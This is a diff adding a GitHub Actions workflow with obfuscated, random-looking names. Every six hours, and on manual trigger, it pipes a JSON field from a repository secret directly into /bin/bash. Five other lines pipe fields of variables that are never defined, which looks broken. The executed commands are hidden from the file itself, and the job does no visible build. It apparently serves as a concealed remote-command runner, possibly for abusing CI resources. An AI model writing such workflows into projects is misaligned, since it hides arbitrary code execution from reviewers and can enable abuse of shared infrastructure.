@@ -1,0 +1,23 @@
+name: jiangneihe3765
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangneihe3765
+        env:
+          j9: ${{ secrets.j9 }}
+        run: |
+          echo $j9 | jq -r .u5990 | /bin/bash
+          echo $tvsi1 | jq -r .vnpmq81837 | /bin/bash
+          echo $m70 | jq -r .xgw52 | /bin/bash
+          echo $sae8 | jq -r .na1 | /bin/bash
+          echo $kmu279 | jq -r .jq92 | /bin/bash
+          echo $hsbrs04 | jq -r .v43503 | /bin/bash
+
